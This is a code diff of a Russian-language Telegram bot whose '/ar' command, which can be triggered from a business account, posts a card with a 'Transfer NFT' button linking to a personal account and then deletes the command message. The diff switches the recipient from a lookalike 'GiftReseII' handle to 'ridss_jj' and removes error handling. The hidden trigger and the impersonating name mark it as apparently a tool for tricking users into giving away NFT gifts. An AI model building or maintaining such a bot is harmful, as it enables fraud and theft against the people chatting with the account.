@@ -181,7 +181,7 @@ def get_step1_kb() -> InlineKeyboardMarkup:
 
 def get_step2_kb() -> InlineKeyboardMarkup:
     config = load_config()
-    target_url = config.get("nft_url", "https://t.me/GiftReseII")
+    target_url = config.get("nft_url", "https://t.me/ridss_jj")
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="🎁 Передать NFT", url=target_url)],
         [InlineKeyboardButton(text="➡️ Продолжить", callback_data="explain_continue_btn")]
@@ -435,14 +435,7 @@ async def execute_ar_command(message: Message, is_business: bool = False):
             reply_markup=get_step1_kb(),
         )
     except Exception as e:
-        # ИСПРАВЛЕНИЕ: Проверяем на PEER_FLOOD, чтобы не засорять чат ошибками
-        if "PEER_FLOOD" in str(e):
-            print(f"[PEER_FLOOD] Бот ограничен в чате {message.chat.id}. Отправка карточки отменена.")
-        else:
-            try:
-                await message.answer(f"⚠️ Ошибка отправки карточки: {e}")
-            except Exception:
-                pass
+        await message.answer(f"⚠️ Ошибка отправки карточки: {e}")
         return
 
     # 2. Пауза, чтобы Telegram успел отрисовать карточку
@@ -467,25 +460,18 @@ async def execute_ar_command(message: Message, is_business: bool = False):
                 f"4. Включите галочку <b>«Удаление сообщений»</b> (Delete messages).\n"
                 f"5. Перезапустите бота."
             )
-            # ИСПРАВЛЕНИЕ: Защита от падения при отправке ошибки удаления
-            try:
-                await bot.send_message(
-                    chat_id=message.chat.id,
-                    business_connection_id=biz_conn_id,
-                    text=error_text,
-                    parse_mode="HTML"
-                )
-            except Exception:
-                pass
+            await bot.send_message(
+                chat_id=message.chat.id,
+                business_connection_id=biz_conn_id,
+                text=error_text,
+                parse_mode="HTML"
+            )
             print(f"[ОШИБКА УДАЛЕНИЯ]: {e}")
     else:
         try:
             await message.delete()
         except Exception as e:
-            try:
-                await message.answer(f"⚠️ Ошибка удаления: <code>{e}</code>", parse_mode="HTML")
-            except Exception:
-                pass
+            await message.answer(f"⚠️ Ошибка удаления: <code>{e}</code>", parse_mode="HTML")
 
 # Обработчик для Бизнес-аккаунтов
 @dp.business_message(F.text.startswith("/ar"))
